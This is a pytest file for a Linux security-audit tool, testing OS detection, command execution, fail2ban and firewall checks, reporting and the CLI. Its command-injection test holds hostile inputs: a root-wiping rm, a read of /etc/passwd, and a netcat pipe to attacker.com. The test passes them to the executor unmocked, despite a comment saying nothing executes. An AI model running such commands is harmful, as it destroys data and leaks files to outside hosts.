"""
Unit tests for security_audit.py module
Comprehensive testing with modern pytest practices
"""

import json
import os
import subprocess
import tempfile
import unittest.mock as mock
from unittest.mock import MagicMock, patch

import pytest

# Import the module under test
import security_audit


class TestSystemInfo:
    """Test SystemInfo class functionality."""

    def test_detect_distribution_fedora(self):
        """Test Fedora distribution detection."""
        with patch("builtins.open", mock.mock_open(read_data='ID=fedora\nNAME="Fedora Linux"')):
            result = security_audit.SystemInfo.detect_distribution()
            assert result == "fedora"

    def test_detect_distribution_rhel(self):
        """Test RHEL distribution detection."""
        with patch(
            "builtins.open", mock.mock_open(read_data='ID=rhel\nNAME="Red Hat Enterprise Linux"')
        ):
            result = security_audit.SystemInfo.detect_distribution()
            assert result == "rhel"

    def test_detect_distribution_file_not_found(self):
        """Test distribution detection when os-release file is missing."""
        with patch("builtins.open", side_effect=FileNotFoundError):
            result = security_audit.SystemInfo.detect_distribution()
            assert result == "unknown"

    def test_get_architecture(self):
        """Test architecture detection."""
        with patch("platform.machine", return_value="x86_64"):
            result = security_audit.SystemInfo.get_architecture()
            assert result == "x86_64"

    def test_get_kernel_version(self):
        """Test kernel version detection."""
        with patch("platform.release", return_value="6.5.6-300.fc39.x86_64"):
            result = security_audit.SystemInfo.get_kernel_version()
            assert result == "6.5.6-300.fc39.x86_64"

    def test_is_virtual_machine_true(self):
        """Test VM detection when running in VM."""
        vm_cpuinfo = "processor\t: 0\nvendor_id\t: GenuineIntel\nflags\t\t: hypervisor"
        with patch("builtins.open", mock.mock_open(read_data=vm_cpuinfo)):
            result = security_audit.SystemInfo.is_virtual_machine()
            assert result is True

    def test_is_virtual_machine_false(self):
        """Test VM detection when running on physical hardware."""
        physical_cpuinfo = "processor\t: 0\nvendor_id\t: GenuineIntel\nflags\t\t: fpu vme"
        with patch("builtins.open", mock.mock_open(read_data=physical_cpuinfo)):
            result = security_audit.SystemInfo.is_virtual_machine()
            assert result is False

    def test_is_virtual_machine_file_error(self):
        """Test VM detection when cpuinfo is not accessible."""
        with patch("builtins.open", side_effect=PermissionError):
            result = security_audit.SystemInfo.is_virtual_machine()
            assert result is False


class TestCommandExecutor:
    """Test CommandExecutor class functionality."""

    def test_run_command_success(self):
        """Test successful command execution."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="test output", stderr="")

            result = security_audit.CommandExecutor.run_command("echo test")

            assert result["success"] is True
            assert result["returncode"] == 0
            assert result["stdout"] == "test output"

    def test_run_command_failure(self):
        """Test failed command execution."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=1, stdout="", stderr="command not found")

            result = security_audit.CommandExecutor.run_command("nonexistent_command")

            assert result["success"] is False
            assert result["returncode"] == 1
            assert result["stderr"] == "command not found"

    def test_run_command_timeout(self):
        """Test command timeout handling."""
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("cmd", 1)):
            result = security_audit.CommandExecutor.run_command("sleep 10", timeout=1)

            assert result["success"] is False
            assert "timed out" in result["error"]

    def test_run_command_list_input(self):
        """Test command execution with list input."""
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0, stdout="success", stderr="")

            result = security_audit.CommandExecutor.run_command(["echo", "test"])

            assert result["success"] is True
            mock_run.assert_called_once()


class TestSecurityAuditor:
    """Test SecurityAuditor class functionality."""

    @pytest.fixture
    def auditor(self):
        """Create a SecurityAuditor instance for testing."""
        return security_audit.SecurityAuditor(verbose=False)

    def test_auditor_initialization(self, auditor):
        """Test auditor initialization."""
        assert auditor.verbose is False
        assert "distribution" in auditor.system_info
        assert "architecture" in auditor.system_info
        assert isinstance(auditor.findings, dict)
        assert isinstance(auditor.recommendations, list)

    def test_audit_fail2ban_active(self, auditor):
        """Test fail2ban audit when service is active."""
        with patch.object(auditor.executor, "run_command") as mock_cmd:
            # Mock systemctl is-active fail2ban
            mock_cmd.side_effect = [
                {"success": True, "stdout": "active"},  # systemctl is-active
                {"success": True, "stdout": "Fail2ban v1.0.0"},  # version
                {"success": True, "stdout": "Jail list: sshd"},  # status
            ]

            auditor.audit_fail2ban()

            assert auditor.findings["fail2ban"]["active"] is True

    def test_audit_fail2ban_inactive(self, auditor):
        """Test fail2ban audit when service is inactive."""
        with patch.object(auditor.executor, "run_command") as mock_cmd:
            mock_cmd.return_value = {"success": False, "stdout": "inactive"}

            auditor.audit_fail2ban()

            assert auditor.findings["fail2ban"]["active"] is False

    def test_audit_firewall_active(self, auditor):
        """Test firewall audit when firewalld is active."""
        with patch.object(auditor.executor, "run_command") as mock_cmd:
            mock_cmd.side_effect = [
                {"success": True, "stdout": "active"},  # firewalld status
                {"success": True, "stdout": "drop"},  # default zone
                {"success": True, "stdout": "all"},  # log denied
            ]

            auditor.audit_firewall()

            assert auditor.findings["firewall"]["firewalld_active"] is True

    def test_audit_firewall_inactive(self, auditor):
        """Test firewall audit when no firewall is active."""
        with patch.object(auditor.executor, "run_command") as mock_cmd:
            mock_cmd.side_effect = [
                {"success": False, "stdout": "inactive"},  # firewalld
                {"success": False, "stdout": "inactive"},  # ufw
                {"success": True, "stdout": "5"},  # iptables rules (minimal)
            ]

            auditor.audit_firewall()

            assert auditor.findings["firewall"]["firewalld_active"] is False

    def test_generate_report(self, auditor):
        """Test report generation."""
        # Set up some test findings
        auditor.findings = {"fail2ban": {"active": True}, "firewall": {"firewalld_active": True}}
        auditor.recommendations = ["Test recommendation"]

        with tempfile.TemporaryDirectory() as temp_dir:
            with patch("os.getcwd", return_value=temp_dir):
                report_file = auditor.generate_report()

                assert os.path.exists(report_file)

                # Verify report content
                with open(report_file, "r") as f:
                    report_data = json.load(f)

                assert "metadata" in report_data
                assert "system_info" in report_data
                assert "findings" in report_data
                assert "recommendations" in report_data
                assert "summary" in report_data

    @patch("builtins.print")
    def test_print_methods(self, mock_print, auditor):
        """Test various print methods."""
        auditor.print_header()
        auditor.print_section("Test Section")
        auditor.print_finding("PASS", "Test message")
        auditor.print_finding("FAIL", "Test message")
        auditor.print_finding("WARN", "Test message")
        auditor.print_finding("INFO", "Test message")

        # Verify print was called
        assert mock_print.call_count >= 6


class TestIntegration:
    """Integration tests for the security audit module."""

    @pytest.mark.integration
    def test_full_audit_run(self):
        """Test running a complete audit (requires root for some checks)."""
        auditor = security_audit.SecurityAuditor(verbose=True)

        # This should not raise any exceptions
        auditor.audit_fail2ban()
        auditor.audit_firewall()

        # Generate report
        report_file = auditor.generate_report()

        # Verify report was created
        assert os.path.exists(report_file)

        # Clean up
        os.remove(report_file)

    @pytest.mark.integration
    @pytest.mark.privileged
    def test_audit_with_real_services(self):
        """Test audit against real system services (requires root)."""
        if os.geteuid() != 0:
            pytest.skip("This test requires root privileges")

        auditor = security_audit.SecurityAuditor()

        # Run audits
        auditor.audit_fail2ban()
        auditor.audit_firewall()

        # Should have findings
        assert len(auditor.findings) > 0


class TestCommandLineInterface:
    """Test the command line interface."""

    def test_main_help(self):
        """Test main function with help argument."""
        with patch("sys.argv", ["security_audit.py", "--help"]):
            with pytest.raises(SystemExit) as exc_info:
                security_audit.main()
            assert exc_info.value.code == 0

    def test_main_version(self):
        """Test main function with version argument."""
        with patch("sys.argv", ["security_audit.py", "--version"]):
            with pytest.raises(SystemExit) as exc_info:
                security_audit.main()
            assert exc_info.value.code == 0

    @patch("security_audit.SecurityAuditor")
    def test_main_normal_run(self, mock_auditor_class):
        """Test normal execution of main function."""
        mock_auditor = MagicMock()
        mock_auditor_class.return_value = mock_auditor

        with patch("sys.argv", ["security_audit.py"]):
            with patch("os.geteuid", return_value=0):  # Mock running as root
                security_audit.main()

        mock_auditor_class.assert_called_once_with(verbose=False)
        mock_auditor.run_audit.assert_called_once()

    @patch("security_audit.SecurityAuditor")
    def test_main_verbose_run(self, mock_auditor_class):
        """Test verbose execution of main function."""
        mock_auditor = MagicMock()
        mock_auditor_class.return_value = mock_auditor

        with patch("sys.argv", ["security_audit.py", "--verbose"]):
            with patch("os.geteuid", return_value=0):
                security_audit.main()

        mock_auditor_class.assert_called_once_with(verbose=True)

    def test_main_keyboard_interrupt(self):
        """Test handling of keyboard interrupt."""
        with patch("security_audit.SecurityAuditor", side_effect=KeyboardInterrupt):
            with patch("sys.argv", ["security_audit.py"]):
                with pytest.raises(SystemExit) as exc_info:
                    security_audit.main()
                assert exc_info.value.code == 1


@pytest.mark.performance
class TestPerformance:
    """Performance tests for the security audit module."""

    def test_audit_performance(self, benchmark):
        """Benchmark the audit performance."""
        auditor = security_audit.SecurityAuditor()

        def run_audit():
            auditor.audit_fail2ban()
            auditor.audit_firewall()

        result = benchmark(run_audit)

        # Audit should complete within reasonable time
        assert result is None  # Function doesn't return anything


@pytest.mark.security
class TestSecurity:
    """Security-focused tests."""

    def test_no_hardcoded_credentials(self):
        """Ensure no hardcoded credentials in the code."""
        # Read the source file
        with open("security_audit.py", "r") as f:
            content = f.read().lower()

        # Check for common credential patterns
        forbidden_patterns = [
            "password=",
            "passwd=",
            "secret=",
            "token=",
            "api_key=",
            "private_key=",
        ]

        for pattern in forbidden_patterns:
            assert pattern not in content, f"Found potential hardcoded credential: {pattern}"

    def test_safe_file_operations(self):
        """Test that file operations are safe."""
        # Test with non-existent file
        with patch("builtins.open", side_effect=FileNotFoundError):
            # Should not raise exception
            result = security_audit.SystemInfo.detect_distribution()
            assert result == "unknown"

    def test_command_injection_protection(self):
        """Test protection against command injection."""
        executor = security_audit.CommandExecutor()

        # Test with potentially dangerous input
        dangerous_commands = [
            "echo test; rm -rf /",
            "echo test && cat /etc/passwd",
            "echo test | nc attacker.com 1234",
        ]

        for cmd in dangerous_commands:
            # Should handle safely (though we're not actually executing)
            result = executor.run_command(cmd, timeout=1)
            # The function should return a result structure
            assert isinstance(result, dict)
            assert "command" in result
